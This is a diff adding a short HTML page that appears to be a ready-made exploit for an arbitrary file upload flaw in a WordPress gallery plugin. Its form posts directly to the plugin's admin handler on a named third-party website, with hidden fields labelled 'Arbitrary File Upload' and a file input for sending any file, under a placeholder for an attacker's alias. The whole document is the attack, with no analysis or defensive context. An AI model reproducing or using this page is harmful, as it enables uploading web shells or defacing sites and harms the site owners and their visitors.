@@ -1,0 +1,18 @@
+<html> <head><title>WordPress (Edit)</title>
+<style> body { font-family:Amaranth; }</style>
+</head>
+<body
+><center>
+
+<center><img class="rotateimg1" src="http://i63.tinypic.com/cj3aw.png" width="250" height="240">
+<h1>(Your Code Name)</h1>
+<form action="http://salonbluehair.com/wp-admin/admin.php?page=dreamwork_manage" method="POST" enctype="multipart/form-data">
+ <input type="hidden" name="task" value="drm_add_new_album" />
+ <input type="hidden" name="album_name" value="Arbitrary File Upload" />
+<input type="hidden" name="album_desc" value="Arbitrary File Upload" />
+<input type="file" name="album_img" />
+<input type="submit" value="Submit" />
+ </form>
+</center>
+</body> 
+</html>
